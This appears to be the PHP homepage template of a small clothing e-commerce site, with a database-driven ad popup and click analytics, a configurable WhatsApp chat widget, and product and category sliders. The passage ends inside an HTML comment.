<?php
$pageTitle = "Home -  Doche";
$pageDescription = "Home - Doche";
include 'libs/header.php';
// ================= SELECT POPUP DATA FROM DB =================
$today = date('Y-m-d');
$sql = "SELECT * FROM popup 
        WHERE popup_ed = 1 
        AND ? BETWEEN popup_setting_startdate AND popup_setting_enddate 
        ORDER BY popup_id DESC 
        LIMIT 1;";
$stmt = $dbcon->prepare($sql);
if (!$stmt) {
    die("Prepare failed (SELECT): " . $dbcon->error);
}
$stmt->bind_param("s", $today);
$stmt->execute();
$result = $stmt->get_result();
$popup = $result ? $result->fetch_assoc() : null;
$result->free();
$stmt->close();

// Image & video path
if ($popup) {
    if (!empty($popup['popup_img'])) {
        // Original name pehle store lo
        $imgName = $popup['popup_img'];

        //  Desktop image path
        $popup['popup_img'] = "imgs/uploads/images/" . $imgName;

        // Mobile image path (same name prefix ke sath)
        $popup['popup_img_mobile'] = "imgs/uploads/images/mobile_" . $imgName;
    }

    // if (!empty($popup['popup_video'])) {
    //     $popup['popup_video'] = "imgs/uploads/videos/" . $popup['popup_video'];
    // }
    // Analytics update
    $dbcon->query("UPDATE popup SET popup_analysis_views = popup_analysis_views + 1 WHERE popup_id=" . (int)$popup['popup_id']);
}
// Analytics Update (Click)
if (isset($_POST['popup_id'], $_POST['type'])) {
    $popup_id = (int)$_POST['popup_id'];
    $type     = $_POST['type'];
    if ($popup_id > 0 && in_array($type, ['view', 'click'])) {
        if ($type === 'click') {
            $dbcon->query("UPDATE popup SET popup_analysis_clicks = popup_analysis_clicks + 1 WHERE popup_id=$popup_id");
        }
        echo "ok";
        exit;
    }
    echo "error";
    exit;
}

// =================== WHATSAPP BUTTON SETTINGS ===================

$wa_sql = "SELECT * FROM ptcs_setting_whatsapp WHERE wa_ed = 1 ORDER BY wa_id ASC LIMIT 1";
$wa_stmt = $dbcon->prepare($wa_sql);
$wa_stmt->execute();
$wa_result = $wa_stmt->get_result();
$wa_row = $wa_result->fetch_assoc();
$wa_stmt->close();

$whatsapp_button = null;
$wa_number = $wa_row['wa_number'] ?? '';

if ($wa_row) {
    $wa_id = $wa_row['wa_id'];
    $btn_sql = "SELECT * FROM ptcs_setting_whatsapp_button WHERE wab_number_id = ? ORDER BY wab_id DESC LIMIT 1";
    $btn_stmt = $dbcon->prepare($btn_sql);
    $btn_stmt->bind_param("i", $wa_id);
    $btn_stmt->execute();
    $btn_result = $btn_stmt->get_result();
    $whatsapp_button = $btn_result->fetch_assoc();
    $btn_stmt->close();
}


// if (!$wa_row) {
// echo "<p style='color:red'>⚠️ No WhatsApp number found!</p>";
// }

?>
<!--  POPUP DISPLAY CODE -->
<style>
/* 🔹 Title Animations */
.title-simple {
    animation: none;
}

@keyframes blinkAnim {
    50% {
        opacity: 0;
    }
}

.title-blink {
    animation: blinkAnim 1s step-start infinite;
}

@keyframes flashAnim {

    0%,
    50%,
    100% {
        opacity: 1;
    }

    25%,
    75% {
        opacity: 0;
    }
}

.title-flash {
    animation: flashAnim 1s infinite;
}

/* 🔹 Slidein Animation */
.slidein-popup {
    transform: translateY(100%);
    opacity: 0;
    transition: transform 0.5s ease-in-out, opacity 0.5s ease-in-out;
}

.slidein-popup.show {
    transform: translateY(0);
    opacity: 1;
}

/* 🔹 Modal Fade+Scale */
@keyframes modalIn {
    0% {
        transform: scale(0.9);
        opacity: 0;
    }

    100% {
        transform: scale(1);
        opacity: 1;
    }
}

.animate-modalIn {
    animation: modalIn 0.3s ease-out forwards;
}

/* 🔹 Optional smooth transition helper */
.popup-transition {
    transition: all 0.5s ease-in-out;
}
</style>

<!-- whatsapp  -->
<style>
.chat-widget-container {
    z-index: 1000;
}

#chat-toggle-button {
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
    transition: transform 0.2s ease, background-color 0.2s ease;
}

#chat-toggle-button:hover {
    transform: scale(1.1);
    background-color: <?php echo $wab_hover_color;
    ?> !important;
}

#chat-toggle-button i {
    font-size: 32px;
}

#chat-toggle-button svg {
    width: 32px;
    height: 32px;
    fill: white;
}

.chat-popup {
    display: none;
    position: absolute;
    width: 300px;
    background-color: white;
    border-radius: 20px;
    box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
    padding: 20px;
    box-sizing: border-box;
}

.chat-popup::before {
    content: '';
    position: absolute;
    top: -5px;
    left: -5px;
    right: -5px;
    bottom: -5px;
    border-radius: 25px;
    background: <?php echo $wab_color;
    ?>;
    z-index: -1;
}

.popup-tail-svg {
    position: absolute;
    width: 25px;
    height: 16px;
    z-index: 0;
}

.popup-tail-svg.top {
    top: -15px;
    transform: rotate(180deg);
}

.popup-tail-svg.bottom {
    bottom: -15px;
}

.popup-tail-svg.tail-right {
    right: 15px;
    left: auto;
}

.popup-tail-svg.tail-left {
    left: 15px;
    right: auto;
}

.popup-header {
    text-align: center;
    margin-bottom: 20px;
}

.popup-header .logo-icon {
    font-size: 50px;
    color: <?php echo $wab_color;
    ?>;
}

.popup-body {
    text-align: center;
}

.popup-body h2 {
    font-size: 20px;
    color: #333;
    margin: 0 0 20px 0;
}

.start-chat-button {
    display: flex;
    align-items: center;
    justify-content: space-between;
    color: white;
    padding: 15px 20px;
    border-radius: 30px;
    text-decoration: none;
    font-size: 18px;
    font-weight: 500;
    transition: background-color 0.2s ease;
}

.start-chat-button:hover {
    background-color: <?php echo $wab_hover_color;
    ?> !important;
}

.start-chat-button .bi-whatsapp {
    font-size: 24px;
}

.start-chat-button-content {
    display: flex;
    align-items: center;
}

.start-chat-button-content span {
    margin-left: 10px;
}

.start-chat-button .icon-arrow {
    width: 14px;
    height: 14px;
    fill: white;
}

.start-chat-button.without-label {
    justify-content: center;
    padding-left: 30px;
    padding-right: 30px;
}

.start-chat-button.without-label .icon-arrow {
    margin-left: 20px;
}

.start-chat-button.without-label .bi-whatsapp {
    margin-right: 0;
}

.popup-footer {
    display: flex;
    align-items: center;
    justify-content: center;
    margin-top: 15px;
    font-size: 11px;
    color: #aaa;
}

.popup-footer svg {
    width: 12px;
    height: 12px;
    margin-right: 5px;
    fill: #aaa;
}

.animate-bounce {
    animation: bounce 2s infinite;
}

.animate-pulse {
    animation: pulse 2s infinite;
}

.animate-shake {
    animation: shake 0.5s infinite;
}

/* Hide scrollbar only for category slider */
.category-container::-webkit-scrollbar {
    display: none !important;
}

.category-container {
    -ms-overflow-style: none !important;
    scrollbar-width: none !important;
}

/* cursor + prevent text selection while dragging */
.category-container {
    cursor: grab;
    -webkit-user-select: none;
    -ms-user-select: none;
    user-select: none;
}

.category-container.dragging {
    cursor: grabbing;
}

@keyframes bounce {

    0%,
    100% {
        transform: translateY(0);
    }

    50% {
        transform: translateY(-10px);
    }
}

@keyframes pulse {
    0% {
        transform: scale(1);
    }

    50% {
        transform: scale(1.1);
    }

    100% {
        transform: scale(1);
    }
}

@keyframes shake {

    0%,
    100% {
        transform: translateX(0);
    }

    25% {
        transform: translateX(-5px);
    }

    75% {
        transform: translateX(5px);
    }
}
</style>


<!-- sticky whatsapp body -->
<?php
if (!empty($whatsapp_button) && $wa_row && $whatsapp_button['wab_show_sticky'] == 1):
    $wab = $whatsapp_button;

    $sticky_number   = $wab['wab_sticky_number'] ?: $wa_number;
    $wab_message     = $wab['wab_message'] ?: 'Hello! I would like to know more.';
    $wab_color       = $wab['wab_sticky_btn_color'] ?: '#10d876';
    $wab_hover_color = $wab['wab_sticky_btnhover_color'] ?: '#0fa060';
    $wab_position    = $wab['wab_sticky_btn_position'] ?: 'bottom-right';
    $wab_size        = $wab['wab_sticky_btn_size'] ?: 'medium';
    $wab_shape       = $wab['wab_sticky_btn_style'] ?: 'circle';
    $wab_label       = $wab['wab_sticky_btn_label'] ?: 'Start Chat';
    $wab_field_type  = $wab['wab_sticky_field_type'] ?: 'with_name';
    $wab_animation   = $wab['wab_sticky_btn_animation'] ?: 'none';
    $wab_icon_style  = $wab['wab_sticky_icon_style'] ?: 'filled';

    $sizePx = 60;
    if ($wab_size == 'small') $sizePx = 45;
    elseif ($wab_size == 'large') $sizePx = 75;

    $positionStyle = "position: fixed; z-index: 1000;";
    $is_right = (strpos($wab_position, 'right') !== false);
    $is_bottom = (strpos($wab_position, 'bottom') !== false);

    $positionStyle .= $is_right ? "right:30px;" : "left:30px;";
    $positionStyle .= $is_bottom ? "bottom:30px;" : "top:30px;";

    $popup_h_align = $is_right ? "right: 0;" : "left: 0;";
    if ($is_bottom) {
        $popupBottom = $sizePx + 80;
        $popupStyle = "bottom: {$popupBottom}px; {$popup_h_align}";
        $tailPosition = 'bottom';
    } else {
        $popupTop = $sizePx + 20;
        $popupStyle = "top: {$popupTop}px; {$popup_h_align}";
        $tailPosition = 'top';
    }

    $animClass = '';
    if ($wab_animation == 'bounce') $animClass = 'animate-bounce';
    elseif ($wab_animation == 'pulse') $animClass = 'animate-pulse';
    elseif ($wab_animation == 'shake') $animClass = 'animate-shake';

    // Icon Style Logic (filled / outline)
    if ($wab_icon_style == 'filled') {
        $sticky_icon_class = 'bi bi-whatsapp';
        $icon_bg_color = $wab_color;
        $icon_color = 'white';
        $icon_border = "2px solid $wab_color";
    } else {
        $sticky_icon_class = 'bi bi-whatsapp';
        $icon_bg_color = 'white';
        $icon_color = $wab_color;
        $icon_border = "2px solid $wab_color";
    }

    $start_chat_link = "https://web.whatsapp.com/";
?>

<div class="chat-widget-container" style="<?php echo $positionStyle; ?>">
    <div class="chat-popup" id="chat-popup" style="<?php echo $popupStyle; ?>">
        <div class="popup-header">
            <i class="bi bi-chat-dots logo-icon"></i>
        </div>
        <div class="popup-body">
            <h2><?php echo htmlspecialchars($wab_message); ?></h2>

            <a href="<?php echo $start_chat_link; ?>" target="_blank"
                class="start-chat-button <?php echo ($wab_field_type != 'with_name') ? 'without-label' : ''; ?>"
                style="background-color: <?php echo $wab_color; ?>;">

                <div class="start-chat-button-content">
                    <i class="bi bi-whatsapp"></i>
                    <?php if ($wab_field_type == 'with_name'): ?>
                    <span><?php echo htmlspecialchars($wab_label); ?></span>
                    <?php endif; ?>
                </div>
                <svg class="icon-arrow" viewBox="0 0 8 13">
                    <path d="M1.5 1.5L6.5 6.5L1.5 11.5" stroke="white" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round" />
                </svg>
            </a>
        </div>
        <div class="popup-footer">
            <svg viewBox="0 0 14 20">
                <path
                    d="M4.9092 19.4999L5.45464 12.9999H0.909179L9.09082 0.499878L8.54537 6.99988H13.0908L4.9092 19.4999Z" />
            </svg>
            Powered by swismax.io
        </div>
        <svg class="popup-tail-svg <?php echo $is_right ? 'tail-right' : 'tail-left'; ?> <?php echo $tailPosition; ?>"
            viewBox="0 0 25 16">
            <path d="M0 0 H 25 L 12.5 16 L 0 0 Z" fill="<?php echo $wab_color; ?>" />
            <path d="M2.5 0 L 22.5 0 L 12.5 13 L 2.5 0 Z" fill="white" />
        </svg>
    </div>

    <div id="chat-toggle-button" class="<?php echo $animClass; ?>" style="width: <?php echo $sizePx; ?>px;
               height: <?php echo $sizePx; ?>px;
               background-color: <?php echo $icon_bg_color; ?>;
               border-radius: <?php echo ($wab_shape == 'circle') ? '50%' : '15px'; ?>;
               border: <?php echo $icon_border; ?>;">
        <i id="chat-open-icon" class="<?php echo $sticky_icon_class; ?>"
            style="color: <?php echo $icon_color; ?>; display: block;"></i>
        <svg id="chat-close-icon" style="display: none;" viewBox="0 0 24 24">
            <path d="M7.41 8.59L12 13.17L16.59 8.59L18 10L12 16L6 10L7.41 8.59Z" fill="white" />
        </svg>
    </div>
</div>

<script>
const toggleButton = document.getElementById('chat-toggle-button');
const chatPopup = document.getElementById('chat-popup');
const openIcon = document.getElementById('chat-open-icon');
const closeIcon = document.getElementById('chat-close-icon');

if (openIcon) openIcon.style.display = 'block';
if (closeIcon) closeIcon.style.display = 'none';

toggleButton.addEventListener('click', () => {
    if (chatPopup.style.display === 'none' || chatPopup.style.display === '') {
        chatPopup.style.display = 'block';
        if (openIcon) openIcon.style.display = 'none';
        if (closeIcon) closeIcon.style.display = 'block';
    } else {
        chatPopup.style.display = 'none';
        if (openIcon) openIcon.style.display = 'block';
        if (closeIcon) closeIcon.style.display = 'none';
    }
});
</script>

<?php endif; ?>



<!-- popup body -->
<?php if ($popup): ?>
<?php
    // 🔹 Dynamic Backdrop Handling for All Types
    $popupType = $popup['popup_setting_type'] ?? '';
    $backdropColor = $popup['popup_setting_backdrop_color'] ?? '#000';
    $backdropOpacity = $popup['popup_setting_backdrop_opacity'] ?? 0.5;

    // Convert HEX -> RGBA (for smooth transparency)
    if (preg_match('/^#([A-Fa-f0-9]{6})$/', $backdropColor, $matches)) {
        $hex = $matches[1];
        $r = hexdec(substr($hex, 0, 2));
        $g = hexdec(substr($hex, 2, 2));
        $b = hexdec(substr($hex, 4, 2));
        $backdropColor = "rgba($r, $g, $b, $backdropOpacity)";
    } elseif (stripos($backdropColor, 'rgba') === false && stripos($backdropColor, 'rgb') === false) {
        // fallback (in case color format unexpected)
        $backdropColor = "rgba(0, 0, 0, $backdropOpacity)";
    }
?>
<div id="popup-wrapper" class="hidden fixed z-50
            <?php if ($popupType === 'fullscreen' || $popupType === 'modal'): ?>
                inset-0
            <?php elseif ($popupType === 'slidein'): ?>
                right-0 bottom-0 
            <?php endif; ?>">

    <!-- === BACKDROP (Dynamic for all popup types) === -->
    <div id="popup-backdrop" class="absolute inset-0"
        style="background-color: <?= htmlspecialchars($backdropColor) ?>;"></div>

    <!-- === POPUP MODAL === -->
    <div id="popupModal" class="relative bg-white shadow-2xl transition-all duration-300 flex flex-col
            <?php if ($popupType === 'fullscreen'): ?>
                w-full h-full overflow-hidden
            <?php elseif ($popupType === 'modal'): ?>
                w-full max-w-lg mx-auto rounded-xl animate-modalIn 
            <?php elseif ($popupType === 'slidein'): ?>
                w-[320px] h-[50vh] rounded-t-2xl shadow-2xl flex flex-col overflow-hidden
                fixed right-0 bottom-0  
                transform translate-y-full opacity-0
                transition-all duration-500 ease-in-out popup-transition
            <?php endif; ?>">

        <!-- === POPUP INNER CONTENT === -->
        <div class="flex flex-col w-full h-full">

            <!-- === TITLE === -->
            <?php if (!empty($popup['popup_title']) && $popup['popup_setting_title_ed'] == 1): ?>
            <div class="flex justify-center items-center p-4 border-b z-10 relative text-center">
                <h5 class="text-lg font-semibold mx-auto
                            <?php if (strtolower($popup['popup_setting_title_type']) === 'simple') echo 'title-simple'; ?>
                            <?php if (strtolower($popup['popup_setting_title_type']) === 'flash') echo 'title-flash'; ?>
                            <?php if (strtolower($popup['popup_setting_title_type']) === 'blink') echo 'title-blink'; ?>"
                    style="color:<?= $popup['popup_setting_title_color'] ?? '#000' ?>">
                    <?= htmlspecialchars($popup['popup_title']) ?>
                </h5>

                <?php if ($popup['popup_setting_closeable_ed'] == 1): ?>
                <button id="popupCloseBtn" class="absolute right-2 top-2 text-gray-600 hover:text-white bg-transparent 
                                hover:bg-red-600 transition-all duration-200 w-8 h-8 flex 
                                items-center justify-center text-2xl font-bold transform hover:scale-105 rounded-full">
                    &times;
                </button>
                <?php endif; ?>
            </div>
            <?php endif; ?>

            <!-- === CONTENT === -->
            <?php if (!empty($popup['popup_content'])): ?>
            <div class="p-4 z-10 relative text-center"
                style="color: <?= $popup['popup_setting_title_color'] ?? '#000' ?>; font-size: 16px;">
                <?= nl2br(htmlspecialchars($popup['popup_content'])) ?>
            </div>
            <?php endif; ?>

            <!-- === IMAGE / VIDEO === -->
            <div class="flex-1 relative w-full h-full overflow-hidden flex items-center justify-center p-4">
                <?php if (!empty($popup['popup_img'])): ?>
                <a href="<?= $popup['popup_img_target_url'] ?? '#' ?>" target="_blank"
                    onclick="updateAnalytics('click')" class="block w-full h-full flex items-center justify-center">

                    <picture>
                        <source srcset="<?= $popup['popup_img_mobile'] ?>" media="(max-width: 768px)">
                        <img src="<?= $popup['popup_img'] ?>" class="<?php if ($popupType === 'fullscreen'): ?>
                                        w-full h-auto object-contain
                                    <?php else: ?>
                                        max-w-full max-h-80 object-contain
                                    <?php endif; ?> rounded-lg shadow" alt="Popup Image">
                    </picture>
                </a>
                <?php endif; ?>

                <?php
                    // 🔹 Height settings based on popup type
                    $videoContainerHeight = ($popupType === 'fullscreen') ? '720px' : 'auto';
                    $videoContainerMaxHeight = ($popupType === 'fullscreen') ? 'none' : '400px';
                    $videoContainerMinWidth = '300px';

                    // 🔹 Video URL handling
                    $popup_video_url = $popup['popup_video_url'] ?? '';

                    if (!empty($popup_video_url)):
                        $display_html = '';

                        // YouTube
                        if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $popup_video_url, $matches)) {
                            $video_id = $matches[1];
                            $embed_url = "https://www.youtube.com/embed/{$video_id}?autoplay=1&loop=1&mute=1";
                            $display_html = '<iframe src="' . $embed_url . '" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen style="width: 100%; height: 100%;"></iframe>';
                        }
                        // Vimeo
                        elseif (preg_match('/vimeo\.com\/(?:video\/)?(\d+)/', $popup_video_url, $matches)) {
                            $video_id = $matches[1];
                            $embed_url = "https://player.vimeo.com/video/{$video_id}?autoplay=1&loop=1&muted=1";
                            $display_html = '<iframe src="' . $embed_url . '" frameborder="0" allow="autoplay; fullscreen; picture-in-picture" allowfullscreen style="width: 100%; height: 100%;"></iframe>';
                        }
                        // Direct or other link
                        else {
                            $is_direct_video_file = (strpos($popup_video_url, '.mp4') !== false || strpos($popup_video_url, '.webm') !== false || strpos($popup_video_url, '.ogg') !== false);
                            if ($is_direct_video_file) {
                                $display_html = '<video src="' . htmlspecialchars($popup_video_url) . '" class="max-w-full max-h-80 object-contain rounded-lg shadow" autoplay muted loop playsinline controls></video>';
                            } else {
                                $display_html = '<iframe src="' . htmlspecialchars($popup_video_url) . '" frameborder="0" allowfullscreen style="width: 100%; height: 100%;"></iframe>';
                            }
                        }

                        // Final Output
                        if (!empty($display_html)): ?>
                <div class="video-container" style="
                                width: 100%;
                                min-width: <?= $videoContainerMinWidth ?>;
                                height: <?= $videoContainerHeight ?>; 
                                max-height: <?= $videoContainerMaxHeight ?>;
                                aspect-ratio: 16 / 9;
                                overflow: hidden;
                                display: flex; 
                                align-items: stretch; 
                                justify-content: stretch;">
                    <?= $display_html ?>
                </div>
                <?php endif; ?>
                <?php endif; ?>
            </div>

            <!-- === BUTTON === -->
            <?php if (!empty($popup['popup_setting_btn_name']) && $popup['popup_setting_btn_ed'] == 1): ?>
            <div class="p-4 border-t text-center z-10 relative">
                <a href="<?= $popup['popup_setting_btn_url'] ?? '#' ?>" target="_blank"
                    class="px-6 py-2 rounded-lg font-semibold text-white transition"
                    style="background-color:<?= $popup['popup_setting_btn_color'] ?? '#0d6efd' ?>;"
                    onmouseover="this.style.backgroundColor='<?= $popup['popup_setting_btn_hovercolor'] ?? '#0a58ca' ?>'"
                    onmouseout="this.style.backgroundColor='<?= $popup['popup_setting_btn_color'] ?? '#0d6efd' ?>'"
                    onclick="updateAnalytics('click')">
                    <?= htmlspecialchars($popup['popup_setting_btn_name']) ?>
                </a>
            </div>
            <?php endif; ?>
        </div>
    </div>
</div>
<?php endif; ?>

<section class="">
    <div class="swiper home-slider">
        <div class="swiper-wrapper">
            <?php
            $getSlides = mysqli_query($dbcon, "SELECT * FROM sm_slider");
            while ($rowSlides = mysqli_fetch_assoc($getSlides)) { ?>
            <div class="swiper-slide relative border-y">

                <!-- Desktop Image -->
                <img src="imgs/slides/<?= $rowSlides['sl_image'] ?>" alt=""
                    class="hidden lg:block w-full h-[400px] object-cover">

                <!-- Mobile Image -->
                <img src="imgs/slides/<?= $rowSlides['sl_mobimage'] ?>" alt=""
                    class="block lg:hidden w-full h-64 object-cover">

                <!-- Text Overlay -->
                <div
                    class="absolute inset-0 text-sm text-black flex flex-col max-w-2xl justify-center items-start px-6 md:px-16 lg:px-24 z-10 ">
                    <h2 class="text-2xl font-herosan md:text-4xl font-semibold mb-2"><?= $rowSlides['sl_heading'] ?>
                    </h2>
                    <div class=" h-2 rounded w-28 bg-pri mb-4"></div>
                    <?= htmlspecialchars_decode($rowSlides['sl_text']) ?>
                    <div class="text-2xl flex items-center gap-5 mt-8 justify-end">
                        <a href="explore-products.php"
                            class="flex items-center gap-2 bg-pri hover:bg-sec text-base text-sec hover:text-pri font-semibold px-5 py-1 rounded-md shadow transition">
                            <i class="bi bi-bag-fill  text-lg mr-1"></i>
                            ORDER&nbsp;NOW
                        </a>
                        <a href="explore-products.php" target="_blank"
                            class="flex items-center bg-sec hover:bg-pri text-base text-pri hover:text-sec font-semibold text-base hover:text-pri  px-5 py-1 rounded-md shadow transition">
                            <i class="bi bi-box text-xl mr-1"></i>
                            VIEW ALL PRODUCTS
                        </a>
                    </div>
                </div>
            </div>
            <?php } ?>

        </div>
        <div class="swiper-pagination"></div>
    </div>
</section>





<section class="mt-10 px-4 category-section">
    <!-- Section Heading -->
    <h1
        class="relative inline-block text-3xl sm:text-4xl text-center font-semibold mb-8 text-gray-800 tracking-wide uppercase left-1/2 -translate-x-1/2">
        <span>Shop by categories</span>
        <!-- <span class="absolute left-1/2 -bottom-2 -translate-x-1/2 w-36  h-[3px] bg-pri rounded-full"></span> -->
    </h1>


    <!-- Scrollable Horizontal Line -->
    <div class="category-container container mx-auto overflow-x-auto">
        <div class="category-slider flex space-x-6 w-max px-2 cursor-grab">
            <?php 
        $select = "SELECT * FROM sm_categories LIMIT 8";
        $result = mysqli_query($dbcon, $select);

        if (mysqli_num_rows($result) > 0) {
          while ($row = mysqli_fetch_assoc($result)) {
      ?>
            <!-- Single Category Card -->
            <a href="category-detail.php?ct_id=<?php echo $row['ct_id'] ?>"
                class="group relative rounded-2xl overflow-hidden shadow-md hover:shadow-2xl transition-all duration-500 cursor-pointer w-[220px] sm:w-[250px] md:w-[200px] flex-shrink-0">

                <!-- Image -->
                <div class="relative w-full h-64 sm:h-54 overflow-hidden">
                    <img src="imgs/categories/<?php echo htmlspecialchars($row['cat_image']); ?>"
                        alt="<?php echo htmlspecialchars($row['ct_name']); ?>"
                        class="absolute inset-0 w-full h-full object-cover group-hover:scale-110 transition-transform duration-700 ease-out">
                </div>

                <!-- Overlay -->
                <div
                    class="absolute inset-0 bg-black/30 group-hover:bg-black/60 transition-all duration-500 flex items-center justify-center">
                    <h2
                        class="text-white text-lg sm:text-xl font-semibold uppercase tracking-wide text-center px-2 group-hover:text-red-400 transition-colors duration-300">
                        <?php echo htmlspecialchars($row['ct_name']); ?>
                    </h2>
                </div>
            </a>
            <?php
          }
        } else {
          echo "<p class='text-center text-gray-500 w-full'>No categories found.</p>";
        }
      ?>
        </div>
    </div>
</section>


<!-- SHOP SALE -->
<section class="mt-20 px-4">
    <!-- Title -->
    <div>
        <h2 class="text-4xl sm:text-5xl text-pri text-center uppercase font-semibold tracking-wider">
            Discounted Products
        </h2>
    </div>

    <!-- Discount Filter -->
    <div class="mx-auto w-fit flex flex-wrap justify-center gap-6 items-center mt-10" id="discount-filters">
        <?php
    $getDiscounts = mysqli_query($dbcon, "SELECT DISTINCT pro_discount FROM sm_products WHERE pro_discount > 0");
    while ($row = mysqli_fetch_assoc($getDiscounts)) {
    ?>
        <p data-discount="<?= $row['pro_discount']; ?>"
            class="discount-btn text-pri uppercase text-sm sm:text-base font-semibold border-b border-transparent hover:border-pri cursor-pointer transition-all duration-300">
            <?= $row['pro_discount'] ?>% off
        </p>
        <?php } ?>
    </div>

    <!-- Product Section -->
    <div class="mt-16 container mx-auto flex flex-col lg:flex-row items-center gap-10">
        <!-- Left Image
        <div class="w-full lg:w-1/3 rounded-2xl overflow-hidden shadow-lg">
            <img src="imgs/about.jpg" alt="Sale Banner" class="w-full h-auto object-cover" />
        </div> -->

        <!-- Product Slider -->
        <div class="w-full ">
            <div id="product-slider">
                <?php include 'ajax/load_products.php'; ?>
            </div>
        </div>
    </div>
</section>





<section class="mt-20">
    <h1 class="text-4xl text-center font-semibold uppercase">New Arrivals</h1>

    <div class="container mx-auto mt-10">
        <!-- ✅ Swiper Container -->
        <div class="swiper trending-slider">
            <div class="swiper-wrapper">
                <?php
        $getProducts = mysqli_query($dbcon, "    SELECT * 
    FROM sm_products 
    WHERE pro_status = '1' 
    ORDER BY pro_id DESC
    LIMIT 15");
        while ($row = mysqli_fetch_assoc($getProducts)) {
        ?>
                <!-- ✅ Product Card -->
                <div onclick="window.location.href='product-details2.php?pro_id=<?= $row['pro_id'] ?>'"
                    class="swiper-slide group/card cursor-pointer bg-white rounded-2xl overflow-hidden shadow-md hover:shadow-2xl transition-all duration-500 border border-gray-100">

                    <!-- Product Image -->
                    <div class="relative overflow-hidden rounded-t-2xl">
                        <img src="imgs/products/<?= $row['pro_image'] ?>"
                            alt="<?= htmlspecialchars($row['pro_name']) ?>"
                            class="w-full h-64 sm:h-72 object-cover transition-transform duration-700 group-hover/card:scale-110" />
                        <span
                            class="absolute bottom-2 right-2 px-2 py-1 text-xs font-semibold rounded-full 
                        <?php echo ($row['pro_ava_qty'] > 0) ? 'bg-green-500 text-white' : 'bg-red-500 text-white'; ?>">
                            <?php echo ($row['pro_ava_qty'] > 0) ? 'In Stock' : 'Out of Stock'; ?>
                        </span>
                    </div>

                    <!-- Product Info -->
                    <div class="p-4">
                        <div class="text-xs sm:text-sm text-gray-600 flex justify-between items-center">
                            <p>Ready To Wear</p>
                            <i class="bi bi-suit-heart text-gray-500 hover:text-red-600 transition"></i>
                        </div>

                        <h1
                            class="uppercase text-sm sm:text-base font-semibold mt-1 text-gray-800 line-clamp-1 leading-tight group-hover/card:text-pri transition">
                            <?= $row['pro_name'] ?>
                        </h1>

                        <div class="mt-2 flex justify-between items-center">
                            <div>
                                <del class="text-xs text-gray-400 block">PKR 4,780</del>
                                <p class="text-sm font-semibold text-red-500 -mt-1">
                                    PKR <?= number_format($row['pro_price']) ?>
                                </p>
                            </div>

                            <!-- Quick Shop (hover only) -->
                            <div
                                class="opacity-0 invisible transition-all duration-300 group-hover/card:opacity-100 group-hover/card:visible">
                                <div
                                    class="bg-black py-1 px-5 text-white uppercase text-[10px] rounded-full overflow-hidden flex items-center justify-center h-8 w-28">
                                    <span
                                        class="block transform transition-all duration-300 group-hover:translate-y-6">Quick</span>
                                    <span
                                        class="absolute transform translate-y-8 transition-all duration-300 group-hover:translate-y-0">
                                        <i class="bi bi-bag-plus text-white text-sm"></i>
                                    </span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <?php } ?>
            </div>

            <!-- Pagination Dots -->
            <div class="swiper-pagination mt-4"></div>
        </div>
    </div>
</section>

<!-- ✅ Swiper Responsive JS -->
<script>
document.addEventListener("DOMContentLoaded", function() {
    new Swiper(".trending-slider", {
        spaceBetween: 20,
        grabCursor: true,
        loop: false,
        pagination: {
            el: ".swiper-pagination",
            clickable: true,
        },
        breakpoints: {
            0: {
                slidesPerView: 1.3,
                spaceBetween: 12
            }, // 📱 mobile
            480: {
                slidesPerView: 1.7,
                spaceBetween: 14
            }, // small phones
            640: {
                slidesPerView: 2,
                spaceBetween: 16
            }, // tablets
            768: {
                slidesPerView: 2.5,
                spaceBetween: 18
            }, // medium
            1024: {
                slidesPerView: 3,
                spaceBetween: 20
            }, // large
            1280: {
                slidesPerView: 3,
                spaceBetween: 24
            } // extra large
        }
    });
});
</script>




<!-- OUR PRODUCTS -->
<section class="mt-16 px-4 mb-16">
    <!-- Section Title -->
    <h1 class="text-3xl sm:text-4xl text-center font-semibold mb-12 text-gray-800 tracking-wide uppercase">
        Our Products
    </h1>

    <!-- Product Grid -->
    <div class="container mx-auto grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-10">
        <?php 
    $select = "SELECT * FROM sm_products LIMIT 8";
    $result = mysqli_query($dbcon, $select);

    if (mysqli_num_rows($result) > 0) {
        while ($row = mysqli_fetch_assoc($result)) {
    ?>
        <!-- Single Product Card -->
        <a href="product-details2.php?pro_id=<?= $row['pro_id'] ?>"
            class="group border border-gray-200 rounded-lg overflow-hidden shadow-sm hover:shadow-xl transition duration-500 bg-white">

            <!-- Product Image -->
            <div class="w-full h-64 overflow-hidden relative">
                <img src="imgs/products/<?php echo htmlspecialchars($row['pro_image']); ?>"
                    alt="<?php echo htmlspecialchars($row['pro_name']); ?>"
                    class="w-full h-full object-cover group-hover:scale-110 transition-transform duration-700 ease-out">

                <!-- Stock Badge -->
                <span class="absolute bottom-2 right-2 px-2 py-1 text-xs font-semibold rounded-full 
                <?php echo ($row['pro_ava_qty'] > 0) ? 'bg-green-500 text-white' : 'bg-red-500 text-white'; ?>">
                    <?php echo ($row['pro_ava_qty'] > 0) ? 'In Stock' : 'Out of Stock'; ?>
                </span>
            </div>

            <!-- Product Info -->
            <div class="p-5 text-center">
                <h2 class="text-lg font-semibold uppercase text-gray-800 group-hover:text-red-700 transition">
                    <?php echo htmlspecialchars($row['pro_name']); ?>
                </h2>
                <div class="w-12 h-[2px] bg-green-500 mx-auto mt-1"></div>

                <!-- Optional: price display -->
                <?php if (!empty($row['pro_price'])): ?>
                <p class="mt-2 text-gray-600 font-medium">Rs. <?php echo htmlspecialchars($row['pro_price']); ?></p>
                <?php endif; ?>
            </div>
        </a>
        <?php
        }
    } else {
        echo "<p class='text-center text-gray-500 w-full'>No products found.</p>";
    }
    ?>
    </div>


    <!-- Explore Button -->
    <div class="text-center mt-12">
        <a href="explore-products.php"
            class="inline-block bg-red-700 text-white px-8 py-3 rounded-lg shadow-md hover:bg-red-800 transition font-semibold tracking-wide">
            Explore Products
        </a>
    </div>
</section>

<!-- 
<section class="mt-20">
    <div class="swiper home-slider2 h-[400px] ">
